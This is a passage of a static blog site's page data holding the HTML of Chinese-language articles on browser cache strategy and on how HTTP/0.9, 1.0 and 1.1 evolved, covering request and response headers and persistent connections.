3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>实际场景</h1>\n<h2 id="频繁变动的资源"><a href="#%E9%A2%91%E7%B9%81%E5%8F%98%E5%8A%A8%E7%9A%84%E8%B5%84%E6%BA%90" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>频繁变动的资源</h2>\n<blockquote>\n<p>Cache-Control: no-cache</p>\n</blockquote>\n<p>对于频繁变动的资源，首先需要使用 Cache-Control: no-cache 使浏览器每次都请求服务器，然后配合 ETag 或者 Last-Modified 来验证资源是否有效。这样的做法虽然不能节省请求数量，但是能显著减少响应数据大小。</p>\n<h2 id="不常变化的资源"><a href="#%E4%B8%8D%E5%B8%B8%E5%8F%98%E5%8C%96%E7%9A%84%E8%B5%84%E6%BA%90" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>不常变化的资源</h2>\n<blockquote>\n<p>Cache-Control: max-age=31536000</p>\n</blockquote>\n<p>通常在处理这类资源时，给它们的 Cache-Control 配置一个很大的 max-age=31536000（一年），这样浏览器之后请求相同的 URL 会命中强制缓存。</p>\n<p>而为了解决更新的问题，就需要在文件名（或者路径）中添加 hash，版本号等动态字符，之后更改动态字符，从而达到更改引用 URL 的目的，让之前的强制缓存失效（其实并未立即失效，只是不再使用了而已）。</p>\n<p>在线提供的类库（如 jquery-3.3.1.min.js, lodash.min.js 等）均采用这个模式。</p>\n<h1 id="用户行为影响"><a href="#%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%BD%B1%E5%93%8D" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>用户行为影响</h1>\n<p>所谓用户行为对浏览器缓存的影响，指的就是用户在浏览器如何操作时，会触发怎样的缓存策略。主要有 3 种：</p>\n<ul>\n<li>打开网页，地址栏输入地址：查找 disk cache 中是否有匹配。如有则使用；如没有则发送网络请求。</li>\n<li>普通刷新 (F5)：因为 TAB 并没有关闭，因此 memory cache 是可用的，会被优先使用（如果匹配的话），其次才是 disk cache。</li>\n<li>强制刷新 (Ctrl + F5)：浏览器不使用缓存，因此发送的请求头部均带有 Cache-control: no-cache（为了兼容，还带了 Pragma: no-cache），服务器直接返回 200 和最新内容。</li>\n</ul>',
id:"/home/runner/work/GatsbyBlog/GatsbyBlog/blog/深入理解浏览器的缓存机制/index.md absPath of file >>> MarkdownRemark",timeToRead:7,frontmatter:{date:"2021-07-16 18:51:10",path:"/deep-learn-browser-cache/",tags:"前端, 浏览器, 高级前端",title:"深入理解浏览器的缓存机制",draft:null}},{excerpt:"HTTP1：HTTP 性能优化 谈及浏览器中的网络，就避不开 HTTP。我们知道 HTTP 是浏览器中最重要且使用最多的协议，是浏览器和服务器之间的通信语言，也是互联网的基石。而随着浏览器的发展，HTTP 为了能适应新的形式也在持续进化，我认为学习 HTTP 的最佳途径就是了解其发展史，所以在接下来的三篇文章中，我会从浏览器发展的视角来和你聊聊 HTTP 演进。这三篇分别是即将完成使命的 HTTP/1、正在向我们走来的 HTTP/2，以及未来的 HTTP/3。 本文主要介绍的是 HTTP/1.…",html:'<h1 id="http1：http-性能优化"><a href="#http1%EF%BC%9Ahttp-%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTP1：HTTP 性能优化</h1>\n<p>谈及浏览器中的网络，就避不开 HTTP。我们知道 HTTP 是浏览器中最重要且使用最多的协议，是浏览器和服务器之间的通信语言，也是互联网的基石。而随着浏览器的发展，HTTP 为了能适应新的形式也在持续进化，我认为学习 HTTP 的最佳途径就是了解其发展史，所以在接下来的三篇文章中，我会从浏览器发展的视角来和你聊聊 HTTP 演进。这三篇分别是即将完成使命的 HTTP/1、正在向我们走来的 HTTP/2，以及未来的 HTTP/3。</p>\n<p>本文主要介绍的是 HTTP/1.1，我们先讲解 HTTP/1.1 的进化史，然后再介绍在进化过程中所遇到的各种瓶颈，以及对应的解决方法。</p>\n<h2 id="超文本传输协议-http09"><a href="#%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE-http09" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>超文本传输协议 HTTP/0.9</h2>\n<p>首先我们来看看诞生最早的 HTTP/0.9。HTTP/0.9 是于 1991 年提出的，主要用于学术交流，需求很简单——用来在网络之间传递 HTML 超文本的内容，所以被称为超文本传输协议。整体来看，它的实现也很简单，采用了基于请求响应的模式，从客户端发出请求，服务器返回数据</p>\n<p>下面我们就来看看 HTTP/0.9 的一个完整的请求流程（可参考下图）。</p>\n<ul>\n<li>因为 HTTP 都是基于 TCP 协议的，所以客户端先要根据 IP 地址、端口和服务器建立 TCP 连接，而建立连接的过程就是 TCP 协议三次握手的过程。</li>\n<li>建立好连接之后，会发送一个 GET 请求行的信息，如 GET /index.html 用来获取 index.html。</li>\n<li>服务器接收请求信息之后，读取对应的 HTML 文件，并将数据以 ASCII 字符流返回给客户端。</li>\n<li>HTML 文档传输完成后，断开连接。</li>\n</ul>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-02-02-52-38342120234171833a1635123a05a30d-9e345.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 38.687150837988824%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsSAAALEgHS3X78AAABW0lEQVQY02VRwUrDQBTMh/kBfkE/wotnwYN4EXsQ9aSteFKh4NGD7cEWlPZQrCAiRmmbNNnaJrt1k5jsvs1m45pKoXVYHm/ZN7zZGSNfRlZgcQUhGOOcA2NMCLEybCw6pZSupmnW641M5YwLAD6djG17iJBjWQOMPQbim8uEp1KmS+T5QvP1eevgcqNGN2uT9/4Fw0dxWE3oaRxUIDi+andKZ0H5lgjgepdhWUPNSQvITKUsvG476ye0dE76TiXnu4rvZ2xPQTnnO9VWa+0w2r4JciW1UqPZvAuCYFrAcVxC/LEftnpO+823nadP9wG5HX/ata17e9B8ND8aPa/7gmYEA4Dhui7GOAxDTR6NRj7GEZ0lvpt8eQAZQoTMYgBFKQsjASwBOo08TSZLf9aytZ9SSu1t8nu4dkUIkFIo9ee/fmXaeZ1B4byhCqxkEMex1kIpRQjpOs/i/9gPSs66JNiKykQAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 02 02 52" title="" data-src="/static/2021-07-15-02-02-52-38342120234171833a1635123a05a30d-fee1c.png" data-srcset="/static/2021-07-15-02-02-52-38342120234171833a1635123a05a30d-a67b7.png 200w,\n/static/2021-07-15-02-02-52-38342120234171833a1635123a05a30d-0b187.png 400w,\n/static/2021-07-15-02-02-52-38342120234171833a1635123a05a30d-fee1c.png 800w,\n/static/2021-07-15-02-02-52-38342120234171833a1635123a05a30d-b1a91.png 1200w,\n/static/2021-07-15-02-02-52-38342120234171833a1635123a05a30d-9e345.png 1432w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>总的来说，当时的需求很简单，就是用来传输体积很小的 HTML 文件，所以 HTTP/0.9 的实现有以下三个特点。</p>\n<ul>\n<li>第一个是只有一个请求行，并没有 HTTP 请求头和请求体，因为只需要一个请求行就可以完整表达客户端的需求了。</li>\n<li>第二个是服务器也没有返回头信息，这是因为服务器端并不需要告诉客户端太多信息，只需要返回数据就可以了。</li>\n<li>第三个是返回的文件内容是以 ASCII 字符流来传输的，因为都是 HTML 格式的文件，所以使用 ASCII 字节码来传输是最合适的。</li>\n</ul>\n<h2 id="被浏览器推动的-http10"><a href="#%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8E%A8%E5%8A%A8%E7%9A%84-http10" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>被浏览器推动的 HTTP/1.0</h2>\n<p>HTTP/0.9 虽然简单，但是已经可以满足当时的需求了。不过变化是这个世界永恒不变的主旋律，1994 年底出现了拨号上网服务，同年网景又推出一款浏览器，从此万维网就不局限于学术交流了，而是进入了高速的发展阶段。随之而来的是万维网联盟（W3C）和 HTTP 工作组（HTTP-WG）的创建，它们致力于 HTML 的发展和 HTTP 的改进。</p>\n<p>万维网的高速发展带来了很多新的需求，而 HTTP/0.9 已经不能适用新兴网络的发展，所以这时就需要一个新的协议来支撑新兴网络，这就是 HTTP/1.0 诞生的原因。不过在详细分析 HTTP/1.0 之前，我们先来分析下新兴网络都带来了哪些新需求。</p>\n<p>首先在浏览器中展示的不单是 HTML 文件了，还包括了 JavaScript、CSS、图片、音频、视频等不同类型的文件。因此支持多种类型的文件下载是 HTTP/1.0 的一个核心诉求，而且文件格式不仅仅局限于 ASCII 编码，还有很多其他类型编码的文件</p>\n<h2 id="那么该如何实现多种类型文件的下载呢？"><a href="#%E9%82%A3%E4%B9%88%E8%AF%A5%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%A7%8D%E7%B1%BB%E5%9E%8B%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%8B%E8%BD%BD%E5%91%A2%EF%BC%9F" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>那么该如何实现多种类型文件的下载呢？</h2>\n<p>文章开头我们说过，HTTP 是浏览器和服务器之间的通信语言，不过 HTTP/0.9 在建立好连接之后，只会发送类似 GET /index.html 的简单请求命令，并没有其他途径告诉服务器更多的信息，如文件编码、文件类型等。同样，服务器是直接返回数据给浏览器的，也没有其他途径告诉浏览器更多的关于服务器返回的文件信息。</p>\n<p>这种简单的交流型形式无疑不能满足传输多种类型文件的需求，那为了让客户端和服务器能更深入地交流，HTTP/1.0 引入了请求头和响应头，它们都是以为 Key-Value 形式保存的，在 HTTP 发送请求时，会带上请求头信息，服务器返回数据时，会先返回响应头信息。至于 HTTP/1.0 具体的请求流程，你可以参考下图。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-02-04-03-2fdacd0bdf28a366cebac9e418ad9733-7985c.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 41.02920723226704%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsSAAALEgHS3X78AAABSklEQVQY03VQTUvDQBDNL/MfiXj0JCh6EzyU3rT4AZ6kF1Evoq25CAW/0hopNdLs5muTTZqQbLLZ3bgmtRbBxyw7M/veDm8ULirKq3IpmKhENc+FzP6HIo8QvClEzfVcVx8N65pRym0bA4AgRK4XUSoJXPIZY3NxI5NoWiPteXP/aO8m69xPkds13g4s48QGZ5Zx+DjubV/GHTVMs+xbTAjRNG15MsuT47vPlVaxem7GwU5kbRTxVpbtxvb67evpSousdVNe21GCIGi3247juDUghDjwp+7s6gGqQwBN1QJ9B6rA7H+Mr1/eBxcD1HsCPkKUUiXPc13Xfd/HGHueN5lMEPIxclLXTDCKZgRAP05oFJEAZ1mak9AJgSHFv54XaMzTsiS0LKi8ZRScs8VrQVlRLi1M/GDxBec8TVO5jjAMEUJJkjTNP5O+AMBdvDjzCafkAAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 02 04 03" title="" data-src="/static/2021-07-15-02-04-03-2fdacd0bdf28a366cebac9e418ad9733-fee1c.png" data-srcset="/static/2021-07-15-02-04-03-2fdacd0bdf28a366cebac9e418ad9733-a67b7.png 200w,\n/static/2021-07-15-02-04-03-2fdacd0bdf28a366cebac9e418ad9733-0b187.png 400w,\n/static/2021-07-15-02-04-03-2fdacd0bdf28a366cebac9e418ad9733-fee1c.png 800w,\n/static/2021-07-15-02-04-03-2fdacd0bdf28a366cebac9e418ad9733-b1a91.png 1200w,\n/static/2021-07-15-02-04-03-2fdacd0bdf28a366cebac9e418ad9733-7985c.png 1438w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>有了请求头和响应头，浏览器和服务器就能进行更加深入的交流了。</p>\n<p>那 HTTP/1.0 是怎么通过请求头和响应头来支持多种不同类型的数据呢？</p>\n<p>要支持多种类型的文件，我们就需要解决以下几个问题</p>\n<ul>\n<li>首先，浏览器需要知道服务器返回的数据是什么类型的，然后浏览器才能根据不同的数据类型做针对性的处理。</li>\n<li>其次，由于万维网所支持的应用变得越来越广，所以单个文件的数据量也变得越来越大。为了减轻传输性能，服务器会对数据进行压缩后再传输，所以浏览器需要知道服务器压缩的方法。</li>\n<li>再次，由于万维网是支持全球范围的，所以需要提供国际化的支持，服务器需要对不同的地区提供不同的语言版本，这就需要浏览器告诉服务器它想要什么语言版本的页面。</li>\n<li>最后，由于增加了各种不同类型的文件，而每种文件的编码形式又可能不一样，为了能够准确地读取文件，浏览器需要知道文件的编码类型</li>\n</ul>\n<p>基于以上问题，HTTP/1.0 的方案是通过请求头和响应头来进行协商，在发起请求时候会通过 HTTP 请求头告诉服务器它期待服务器返回什么类型的文件、采取什么形式的压缩、提供什么语言的文件以及文件的具体编码。最终发送出来的请求头内容如下：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="70906489209833600000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`accept: text/html\naccept-encoding: gzip, deflate, br\naccept-Charset: ISO-8859-1,utf-8\naccept-language: zh-CN,zh`, `70906489209833600000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title=""\n              >\n                \n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">accept: text/html\naccept-encoding: gzip, deflate, br\naccept-Charset: ISO-8859-1,utf-8\naccept-language: zh-CN,zh</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>其中第一行表示期望服务器返回 html 类型的文件，第二行表示期望服务器可以采用 gzip、deflate 或者 br 其中的一种压缩方式，第三行表示期望返回的文件编码是 UTF-8 或者 ISO-8859-1，第四行是表示期望页面的优先语言是中文。</p>\n<p>服务器接收到浏览器发送过来的请求头信息之后，会根据请求头的信息来准备响应数据。不过有时候会有一些意外情况发生，比如浏览器请求的压缩类型是 gzip，但是服务器不支持 gzip，只支持 br 压缩，那么它会通过响应头中的 content-encoding 字段告诉浏览器最终的压缩类型，也就是说最终浏览器需要根据响应头的信息来处理数据。下面是一段响应头的数据信息：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="96732793512720680000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`content-encoding: br\ncontent-type: text/html; charset=UTF-8`, `96732793512720680000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title=""\n              >\n                \n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">content-encoding: br\ncontent-type: text/html; charset=UTF-8</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>\n<p>其中第一行表示服务器采用了 br 的压缩方法，第二行表示服务器返回的是 html 文件，并且该文件的编码类型是 UTF-8。</p>\n<p>有了响应头的信息，浏览器就会使用 br 方法来解压文件，再按照 UTF-8 的编码格式来处理原始文件，最后按照 HTML 的方式来解析该文件。这就是 HTTP/1.0 支持多文件的一个基本的处理流程。</p>\n<p>HTTP/1.0 除了对多文件提供良好的支持外，还依据当时实际的需求引入了很多其他的特性，这些特性都是通过请求头和响应头来实现的。下面我们来看看新增的几个典型的特性</p>\n<ul>\n<li>有的请求服务器可能无法处理，或者处理出错，这时候就需要告诉浏览器服务器最终处理该请求的情况，这就引入了状态码。状态码是通过响应行的方式来通知浏览器的。</li>\n<li>为了减轻服务器的压力，在 HTTP/1.0 中提供了 Cache 机制，用来缓存已经下载过的数据。</li>\n<li>服务器需要统计客户端的基础信息，比如 Windows 和 macOS 的用户数量分别是多少，所以 HTTP/1.0 的请求头中还加入了用户代理的字段</li>\n</ul>\n<h2 id="缝缝补补的-http11"><a href="#%E7%BC%9D%E7%BC%9D%E8%A1%A5%E8%A1%A5%E7%9A%84-http11" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>缝缝补补的 HTTP/1.1</h2>\n<p>不过随着技术的继续发展，需求也在不断迭代更新，很快 HTTP/1.0 也不能满足需求了，所以 HTTP/1.1 又在 HTTP/1.0 的基础之上做了大量的更新。接下来我们来看看 HTTP/1.0 遇到了哪些主要的问题，以及 HTTP/1.1 又是如何改进的。</p>\n<h3 id="改进持久连接"><a href="#%E6%94%B9%E8%BF%9B%E6%8C%81%E4%B9%85%E8%BF%9E%E6%8E%A5" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>改进持久连接</h3>\n<p>HTTP/1.0 每进行一次 HTTP 通信，都需要经历建立 TCP 连接、传输 HTTP 数据和断开 TCP 连接三个阶段（如下图）。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-02-06-41-2f675d0c4f71f00bad6a966d73dfb22e-09eb7.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 95.27145359019265%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAIAAAAf7rriAAAACXBIWXMAAAsSAAALEgHS3X78AAACSUlEQVQ4y5WT30/TUBTH+48ZI8bFgWEEN5iLxsSY6GIID4KGLewBkRd9Mr5p3K+u3Q+bIYGMjG2dE39AQH7UEDFE50a3yQYZpVtL23uv3VYbAzOOm5Ob3HvOJ/fc7zkHQycWhI39qAjm7MqcHcSGlJlbcHum6QInYrFTbAOuV/cyPueiz/E+4KJfjWbX4k3X/2DQfHiXQ1dCwExB2zQwEMDPQN3VEXw5hEwUuhpFFwjkY1B7WL3STU+7wtUnAvRUMP0knHF5E/TGjybccMG/DDslWONj8DAnh/ol1cIWGTfCTby9YG+zwL2u4BsywSgHgiY35PeEBYcQHxOT48L8iLwTb6XFctCRlMaS0nBMIhgZUw/n3GIvKfYGxe0KbMFyNc96B1nPAItfz780cZ/JJgy2ysAUFAdfH/eHxEcZCXOmpEt+0UqJloj4taJpUuCALbh/mzqwR/fNgUqEEVr3W2VowMUeQjzvFVxpCZv9pjz9ID/7JD9flst1DVbV7g6hPgpZougigfxftE/yElzMgXc5QGeBmibWtsGKnHKTLNyJFO5RRRvOUptH/yyV8sd0SZVqfg+3lvzWX8SNktvEr5EtlxqiB6sHrG1vg1qFpydrqcka/ZhfGD/+nu6ot7U6V3+KeLfgNwpkn+DpUtY9ZxiMMic4yZWJyMoUtfoAX0owrN5hHfW2MdxQe2AadZGa2mcYjJ4wMkfRtTfIoMJMZ3ArbaFaWvIMq7bsu//xxd3d1dmO5lkrNF9CiRGUGEWph2h+CO3E2gr2G7Ea+yA8XpjJAAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 02 06 41" title="" data-src="/static/2021-07-15-02-06-41-2f675d0c4f71f00bad6a966d73dfb22e-fee1c.png" data-srcset="/static/2021-07-15-02-06-41-2f675d0c4f71f00bad6a966d73dfb22e-a67b7.png 200w,\n/static/2021-07-15-02-06-41-2f675d0c4f71f00bad6a966d73dfb22e-0b187.png 400w,\n/static/2021-07-15-02-06-41-2f675d0c4f71f00bad6a966d73dfb22e-fee1c.png 800w,\n/static/2021-07-15-02-06-41-2f675d0c4f71f00bad6a966d73dfb22e-09eb7.png 1142w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>在当时，由于通信的文件比较小，而且每个页面的引用也不多，所以这种传输形式没什么大问题。但是随着浏览器普及，单个页面中的图片文件越来越多，有时候一个页面可能包含了几百个外部引用的资源文件，如果在下载每个文件的时候，都需要经历建立 TCP 连接、传输数据和断开连接这样的步骤，无疑会增加大量无谓的开销。</p>\n<p>为了解决这个问题，HTTP/1.1 中增加了持久连接的方法，它的特点是在一个 TCP 连接上可以传输多个 HTTP 请求，只要浏览器或者服务器没有明确断开连接，那么该 TCP 连接会一直保持。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-02-06-58-3f9309c343330bb9e3c217b9bcca4669-54f32.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 70.52631578947368%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAAsSAAALEgHS3X78AAAB6ElEQVQoz42Tz08TQRTH95/y0MAVCGIR5GBaijSiMUBixJMYTQQTw8WTiWhkt2Rrf6HbbaH+IIJxm5CY8mOjB0n0YBPg4K+YKu2+NzM743S7hEj20MnL5OXN95N5894bRZxYnMsNN+6DGceVCSxNSod+THtH7gmtEgh/fzP3NRGp6vFq6nJ1cfh3RW8L9lhxax3CqcMRoz5q1Lv1v4+2iAy6XLQFz5RZOEeHTRozaV+GajYLhn/W+X6NH/zhezX+q+FH77wj55ZwtIBjRQxnYGGHyiDj4tvhsbgGXJleIyEVep5CSAPJtOAZi/RnMJrHmIl9aVA9GJi4uIwdGnQnIaQ6qk2VWYtEDZx8ieMvcG7Dh2+/JWfSTXjExNMpeLzdhBuUT62SKyW8+grHllH/QJVrr/HUE6crCZ2ac2PNh2fLZMhLW9pgDjS7CTtURAzoTHhpqs7DTapU9t3CLit9ZsYntnXgN0OmczYLsTzGC9ifBdWDqSusKjOPxLs/3OBq31wnvSmIGChf1JV05jdpcLVliB2Z9FvwXQsHs40LeUfaQKaRsP0+s//FwTdPW6J3SZwviuiK6MmJeVu0NSQt+svqg4o6sa1P7SSvVxb